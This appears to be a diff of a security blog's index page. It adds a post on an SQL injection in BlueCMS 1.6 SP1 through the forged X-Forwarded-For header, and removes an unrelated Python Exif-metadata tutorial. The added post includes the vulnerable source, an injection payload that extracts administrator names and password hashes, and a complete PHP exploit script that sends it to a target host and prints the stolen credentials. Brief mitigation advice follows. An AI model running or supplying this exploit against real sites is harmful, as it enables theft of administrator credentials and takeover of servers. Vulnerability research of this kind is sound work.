@@ -150,6 +150,108 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BlueCMS-1-6-SQL-注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">BlueCMS 1.6 SQL 注入漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/" class="archive-article-date">
+  	<time datetime="2018-11-27T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>BlueCMS是一款国产的CMS平台，十分灵活、方便，早些年广泛的应用于商业系统、个人博客等。</p>
+<p>程序在使用getip()函数获取客户端ip时没有严格过滤数据，导致sql注入漏洞，攻击者通过SQL注入漏洞可直接获取到管理员的账号密码，危害严重</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>BlueCMS V1.6 SP1</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者通过SQL注入漏洞，可直接获取到管理员的账号密码，或者数据库中其他信息，进一步能获取到Webshell，甚至危害服务器的安全。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出现在<code>/comment.php</code> ，关键代码如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == 'send')</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">sql = "<span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">".table('comment')."</span> (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check)<span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'id'</span>, <span class="string">'user_id'</span>, <span class="string">'type'</span>, <span class="string">'mood'</span>, <span class="string">'content'</span>, <span class="string">'timestamp'</span>, <span class="string">'".getip()."'</span>, <span class="string">'is_check'</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">db-&gt;query(sql);</span></span><br></pre></td></tr></table></figure>
+<p>在上述代码中，构造了一个查询语句，赋值给$sql变量，接下来直接执行了此语句，没有进行任何过滤。我们可以看到在sql语句中，有一个值为<code>getip</code> ，这个变量是用户可控的。</p>
+<p>接下来通过搜索找到getip的位置，位于<code>/include/common.fun.php</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);        <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);  <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">    ip = _SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码首先从环境变量中取得用户的ip，如果正常取得ip，则正常返回，如果不存在，则获取客户端用代理服务器访问时的ip，如果还是没有，就继续取<code>X_FORWARDED_FOR</code>的值。</p>
+<p>可以看出来，这里的代码没有经过任何处理，直接取值，然后将取得的值带入到<code>Getip</code>中，因此我们可以通过伪造<code>X_FORWARDED_FOR</code>，构造恶意语句，通过注入，获取数据库敏感信息。</p>
+<p>直接利用Payload获取目标网页目录账号密码。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload构造：<code>00’,’1’),(“,’1’,’0’,’1’,’6’,(select  concat(‘&lt;u-‘,admin_name,’-u&gt;&lt;p-‘,pwd,’-p&gt;’)from  blue_admin),’1281181973’,’99</code>闭合前一个语句，插入下一个语句，能够回显查询语句；</p>
+<p>利用http请求头修改插件：firefox浏览器的插件tamper  data、http live  headers或者burpsuit</p>
+<p>开启tamper data，点击提交正常评论，捕获请求tamper，其余请求submit。</p>
+<p>http请求头处插入一个字段+payload;</p>
+<p>右键查看源代码，管理员账号与密码在页面中。</p>
+<p>或者：</p>
+<p>使用如下命令进入目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:\Program Files\phpstudy\php52</span><br></pre></td></tr></table></figure>
+<p>接下来运行payload，使用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe 1.php xx.xx.xx.xx /Blue/</span><br></pre></td></tr></table></figure>
+<p>上面的命令，意思是：使用php.exe去执行1.php，并设置了ip为xx.xx.xx.xx，目录为Blue。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php sql injection exploit</span></span><br><span class="line">print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">BlueCMS v1.6 sp1 Getip() Remote SQL Injection Exploit</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">'</span>);    </span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>)&#123;</span><br><span class="line">    print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">php '</span>.$argv[<span class="number">0</span>].<span class="string">' localhost /bluecms/</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">7</span>);</span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>,<span class="number">0</span>);</span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$path = $argv[<span class="number">2</span>];</span><br><span class="line">send();</span><br><span class="line">send2();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $cmd = <span class="string">"mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DB"</span>;</span><br><span class="line">    $getinj=<span class="string">" 00','1'),('','1','0','1','6',(select concat('&lt;u-',admin_name,'-u&gt;&lt;p-',pwd,'-p&gt;') from blue_admin),'1281181973','99"</span>;</span><br><span class="line">    $data = <span class="string">"POST "</span>.$path.<span class="string">"comment.php?act=send HTTP/1.1\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept: */*\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Length: "</span>.strlen($cmd).<span class="string">"\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Connection: Close\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"X-Forwarded-For: $getinj\r\n\r\n"</span>;</span><br><span class="line">    $data .= $cmd;</span><br><span class="line">	</span><br><span class="line">    $fp = fsockopen($host,<span class="number">80</span>);</span><br><span class="line">    fputs($fp,$data);</span><br><span class="line">    </span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> ($fp &amp;&amp; !feof($fp))</span><br><span class="line">        $resp .= fread($fp,<span class="number">1024</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $message = <span class="string">"GET "</span>.$path.<span class="string">"news.php?id=1 HTTP/1.1\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept: image/gif,image/jpeg.image/pjpeg,image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Encoding: gzip, deflate\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;GreenBrowser)\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Connection:Keep-Alive\r\n\r\n"</span>;</span><br><span class="line">    $fd = fsockopen($host,<span class="string">'80'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'[-]No response from'</span>.$host;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fputs($fd,$message);</span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> (!feof($fd))&#123;</span><br><span class="line">        $resp.=fgets($fd);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fd);</span><br><span class="line">    preg_match_all(<span class="string">"/&lt;u-([^&lt;]*)-u&gt;&lt;p-([^&lt;]*)-p&gt;/"</span>,$resp,$db);</span><br><span class="line">    <span class="keyword">if</span>($db[<span class="number">1</span>][<span class="number">0</span>]&amp;$db[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username-&gt;"</span>.$db[<span class="number">1</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password-&gt;"</span>.$db[<span class="number">2</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+]congratulation ^^"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'[-]exploited fail &gt;"&lt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ol>
+<li>过滤转义相关参数；</li>
+<li>使用传参数的方式进行查询；  </li>
+<li>使用在线防护产品；</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PHPCMS2008-SQL注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1361,100 +1463,9 @@
 
 
   
-    <article id="post-python解析Exif元数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/15/python解析Exif元数据/">python解析Exif元数据</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/15/python解析Exif元数据/" class="archive-article-date">
-  	<time datetime="2018-10-15T07:14:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>从文件中提取元数据。文件不是清晰可见 的对象，元数据可以存在于文档，电子表格，图像，音频和视频等文件类型中。 创作应用程序可能会存储一些细节如文件的作者，创建和修改时间，潜在的修订和注释。例如，拍照手机可以标记本地的GPS在照片中或者微软的 Word 应用程序可以存储文档的作者。检查每一个文件是个艰难的任务，我们可以使用Python自动处理。</p>
-<h3 id="使用PyPDF解析PDF元数据"><a href="#使用PyPDF解析PDF元数据" class="headerlink" title="使用PyPDF解析PDF元数据"></a>使用PyPDF解析PDF元数据</h3><p>PyPDF 是一个优秀的第三方管理 PDF 文件很实用的库，它提供了文档的信息提取，分割，合并，加密 和解密的能力。</p>
-<p>为了提取元数据，我们使用函数 getDocumentInfo()。这个方法返回一个元组数组，每一个元组包含一个元数据元素和它的值。遍历这个数组并打印 PDF 文件的全部元数据。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> pyPdf</span><br><span class="line"><span class="keyword">from</span> pyPdf <span class="keyword">import</span> PdfFileReader</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMeta</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    pdfFile = PdfFileReader(file(fileName, <span class="string">'rb'</span>))</span><br><span class="line">    docInfo = pdfFile.getDocumentInfo()</span><br><span class="line">    print(<span class="string">'[*]PDF MetaData FOr:'</span> + str(fileName))</span><br><span class="line">    <span class="keyword">for</span> metaItem <span class="keyword">in</span> docInfo:</span><br><span class="line">        print(<span class="string">'[+]'</span> + metaItem + <span class="string">':'</span> + docInfo[metaItem])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage %prog -F &lt;PDF file name&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-F'</span>, dest=<span class="string">'fileName'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify PDF file name'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    fileName = options.fileName</span><br><span class="line">    <span class="keyword">if</span> fileName == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printMeta(fileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h3 id="理解Exif元数据"><a href="#理解Exif元数据" class="headerlink" title="理解Exif元数据"></a>理解Exif元数据</h3><p>Exif 是一种图象文件格式，它的数据存储与 JPEG 格式是完全相同的。实际上 Exif 格式就是在 JPEG 格式头部插入了数码照片的信息，包括拍摄时的光圈、快 门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、 色彩编码、拍摄时录制的声音以及全球定位系统（GPS）、缩略图等。简单地Exif=JPEG+拍摄参数。</p>
-<p>Phil Harvey 编写了一个实用的工具名 叫 exiftool(从 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这" target="_blank" rel="noopener">http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这</a> 些参数。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">investigator$ exiftool photo.JPG</span><br><span class="line">ExifTool Version Number : 8.76</span><br><span class="line">File Name : photo.JPG</span><br><span class="line">Directory : /home/investigator/photo.JPG</span><br><span class="line">File Size : 1626 kB</span><br><span class="line">File Modification Date/Time : 2012:02:01 08:25:37-07:00</span><br><span class="line">File Permissions : rw-r--r--</span><br><span class="line">File Type : JPEG</span><br><span class="line">MIME Type : image/jpeg</span><br><span class="line">Exif Byte Order : Big-endian (Motorola, MM)</span><br><span class="line">Make</span><br><span class="line">: Apple</span><br><span class="line">Camera Model Name : iPhone 4S</span><br><span class="line">Orientation : Rotate 90 CW</span><br><span class="line">&lt;..SNIPPED..&gt;</span><br><span class="line">GPS Altitude : 10 m Above Sea Level</span><br><span class="line">GPS Latitude : 89 deg 59<span class="string">' 59.97" N</span></span><br><span class="line"><span class="string">GPS Longitude : 36 deg 26'</span> 58.57<span class="string">" W</span></span><br><span class="line"><span class="string">&lt;..SNIPPED..&gt;</span></span><br></pre></td></tr></table></figure>
-<p>建立一个脚本来连接web网站，下载图像，并检测他们的Exif元数据。</p>
-<h3 id="使用BeautifulSoup下载图像"><a href="#使用BeautifulSoup下载图像" class="headerlink" title="使用BeautifulSoup下载图像"></a>使用BeautifulSoup下载图像</h3><p><code>BeautifulSoup</code>允许我们快速的解析HTML和 XML文档,使用BeautifulSoup来抓取HTML文档的内容来获取文档中所有的图像。使用urllib2打开文档来读取它，可以创造Beautiful对象或者包含一个不同HTML文档对象的解析树。用这样的对象， 我么可以提取所有的图像标签，通过使用 findall(‘img’)函数，这个函数返回一 个包含所有图像标签的数组。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on'</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br></pre></td></tr></table></figure>
-<p>从网站中下载每一个图像，然后在单独的函数中进行检查。 为了下载图像，我们将用到 urllib2，urlparse 和 os 模块。首先，我们从图像标 签中提取源地址，接着我们读取图像的二进制内容到一个变量，最后我们以写- 二进制模式打开文件将图像内容写入文件。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
-<h3 id="使用python的图像库从图像阅读Exif元数据"><a href="#使用python的图像库从图像阅读Exif元数据" class="headerlink" title="使用python的图像库从图像阅读Exif元数据"></a>使用python的图像库从图像阅读Exif元数据</h3><p>为了测试图像的内容特到 Exif 元数据，我们将使用 Python 图像库 PIL 来处理文 件，可以从 <a href="http://www.pythonware.com/products/pil/获得，以增加" target="_blank" rel="noopener">http://www.pythonware.com/products/pil/获得，以增加</a> Python 的 图像处理能力，并允许我们快速的提取与地理位置相关的元数据信息。为了测 试文件元数据，我们将打开的对象作为 PIL 图像对象并使用函数 getexif()。接 下来我们解析 Exif 数据到一个数组，通过元数据类型索引。数组完成后，我们 可以搜索数组看看它是否包含有 GPSInfo 的 Exif 参数。如果它包含 GPSInfo 参 数，我们就知道对象包含 GPS 元数据并打印信息到屏幕上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><p>将所有的包装在一起，可以连接到一个URL地址，解析并下载所有的图像文件，然后测试每个文件的Exif元数据。</p>
-<p>main()函数中，首先获得站点上的所有图像的列表，然后对数据中的每一个图像，我们将下载并测试它的GPS元数据</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding =UTF-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> 